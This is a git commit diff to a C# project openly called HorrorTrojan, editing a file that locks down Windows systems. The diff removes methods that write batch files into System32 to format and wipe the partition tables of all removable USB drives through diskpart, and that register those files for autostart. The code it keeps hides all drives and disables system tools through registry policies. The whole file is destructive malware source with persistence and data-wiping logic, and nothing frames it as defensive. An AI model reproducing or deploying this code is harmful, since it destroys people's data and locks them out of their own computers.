6d0f8f5ff41f6f9d9c3a96f9a5220a636f8e0550
Virusodel <134794046+Virusodel@users.noreply.github.com>
2026-08-30 12:49:26 +0300

    Update SystemBlocker.cs

--- Trojan/SystemBlocker.cs
+++ Trojan/SystemBlocker.cs
@@ -1,5 +1,4 @@
 using Microsoft.Win32;
-using System.IO;
 
 namespace HorrorTrojan
 {
@@ -26,11 +25,6 @@ namespace HorrorTrojan
             DisableDeviceManager();
             DisableMMC();
             DisableBIOSAccess();
-            
-            // ===== НОВЫЕ БЛОКИРОВКИ USB =====
-            DisableUSBboot();
-            AutoFormatUSB();
-            DestroyUSBMBR();
         }
         
         private static void DisableTaskManager()
@@ -113,12 +107,12 @@ namespace HorrorTrojan
         }
 
         private static void DisableDrives()
-        {
-            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"))
-            {
-                key.SetValue("NoDrives", 0x03FFFFFF, RegistryValueKind.DWord);
-                key.SetValue("NoViewOnDrive", 0x03FFFFFF, RegistryValueKind.DWord);
-            }
+{
+    using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"))
+    {
+        key.SetValue("NoDrives", 0x03FFFFFF, RegistryValueKind.DWord);      // ← СКРЫВАЕТ ВСЕ ДИСКИ
+        key.SetValue("NoViewOnDrive", 0x03FFFFFF, RegistryValueKind.DWord); // ← ЗАПРЕЩАЕТ ПРОСМОТР
+    }
         }
 
         private static void DisableControlPanel()
@@ -155,77 +149,6 @@ namespace HorrorTrojan
         {
             using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\System"))
                 key.SetValue("EnableFirstLogonAnimation", 0, RegistryValueKind.DWord);
-                
-            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\Session Manager\Power"))
-                key.SetValue("HiberbootEnabled", 0, RegistryValueKind.DWord);
-        }
-        
-        // ===== НОВЫЕ МЕТОДЫ ДЛЯ USB (ЧЕРЕЗ DISKPART) =====
-        
-        private static void DisableUSBboot()
-        {
-            try
-            {
-                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\BootManager"))
-                {
-                    key.SetValue("BootMenuPolicy", 1, RegistryValueKind.DWord);
-                    key.SetValue("DisplayBootMenu", 0, RegistryValueKind.DWord);
-                }
-                
-                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\System"))
-                {
-                    key.SetValue("EnableBootMenu", 0, RegistryValueKind.DWord);
-                }
-            }
-            catch { }
-        }
-        
-        private static void AutoFormatUSB()
-        {
-            try
-            {
-                // Создаем .bat файл с diskpart командами
-                // diskpart НЕ БЛОКИРУЕТСЯ через DisableCMD!
-                string batContent = @"@echo off
-for /f ""tokens=2 delims=:"" %%i in ('wmic logicaldisk where drivetype=2 get deviceid ^| findstr :') do (
-    echo select volume %%i > C:\Windows\System32\usbformat.txt
-    echo format fs=fat32 quick >> C:\Windows\System32\usbformat.txt
-    echo exit >> C:\Windows\System32\usbformat.txt
-    diskpart /s C:\Windows\System32\usbformat.txt >nul 2>&1
-    del C:\Windows\System32\usbformat.txt
-)";
-                File.WriteAllText(@"C:\Windows\System32\usbkill.bat", batContent);
-                
-                // Добавляем в автозапуск (через wmic, не через cmd)
-                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"))
-                {
-                    key.SetValue("USBKiller", @"C:\Windows\System32\usbkill.bat", RegistryValueKind.String);
-                }
-            }
-            catch { }
-        }
-        
-        private static void DestroyUSBMBR()
-        {
-            try
-            {
-                // diskpart для затирания MBR на USB
-                string batContent = @"@echo off
-for /f ""tokens=2 delims=:"" %%i in ('wmic logicaldisk where drivetype=2 get deviceid ^| findstr :') do (
-    echo select volume %%i > C:\Windows\System32\usbmbrmbr.txt
-    echo clean >> C:\Windows\System32\usbmbrmbr.txt
-    echo exit >> C:\Windows\System32\usbmbrmbr.txt
-    diskpart /s C:\Windows\System32\usbmbrmbr.txt >nul 2>&1
-    del C:\Windows\System32\usbmbrmbr.txt
-)";
-                File.WriteAllText(@"C:\Windows\System32\usbdestroy.bat", batContent);
-                
-                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"))
-                {
-                    key.SetValue("USBDestroyer", @"C:\Windows\System32\usbdestroy.bat", RegistryValueKind.String);
-                }
-            }
-            catch { }
         }
     }
 }
